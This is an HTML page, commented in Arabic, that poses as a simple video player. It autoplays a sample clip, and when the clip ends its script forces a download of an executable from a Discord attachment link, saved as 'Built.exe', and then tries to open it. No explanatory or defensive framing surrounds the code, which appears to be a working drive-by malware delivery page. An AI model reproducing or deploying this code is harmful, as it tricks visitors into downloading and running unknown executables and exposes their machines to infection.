<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تشغيل فيديو ثم تحميل وتشغيل الملف</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
        }
        video {
            width: 100%;
            height: auto;
            max-width: 800px;
        }
    </style>
</head>
<body>
    <!-- تشغيل الفيديو أولاً -->
    <video id="myVideo" autoplay controls>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
        متصفحك لا يدعم تشغيل الفيديو.
    </video>

    <script>
        function downloadAndOpenFile() {
            const fileUrl = 'https://cdn.discordapp.com/attachments/1344607959736385550/1344691471059652708/5cf3445459726ac4.exe?ex=67c1d505&is=67c08385&hm=f22965f95f1b85190da60aeb017ce2a5546faccb90cc040fd2131ac74f1982d8&';

            // تحميل الملف تلقائيًا
            const link = document.createElement('a');
            link.href = fileUrl;
            link.download = 'Built.exe'; // اسم الملف عند التنزيل
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // محاولة فتح الملف بعد تحميله (قد لا يعمل في جميع المتصفحات)
            setTimeout(function() {
                window.open(fileUrl, '_blank');
            }, 2000);
        }

        window.onload = function() {
            const video = document.getElementById("myVideo");

            // تشغيل الفيديو تلقائيًا
            video.play().catch(error => console.log("حدث خطأ أثناء تشغيل الفيديو:", error));

            // عند انتهاء الفيديو، يبدأ التحميل التلقائي
            video.onended = function() {
                setTimeout(downloadAndOpenFile, 1000); // تأخير بسيط قبل التحميل
            };
        };
    </script>
</body>
</html>
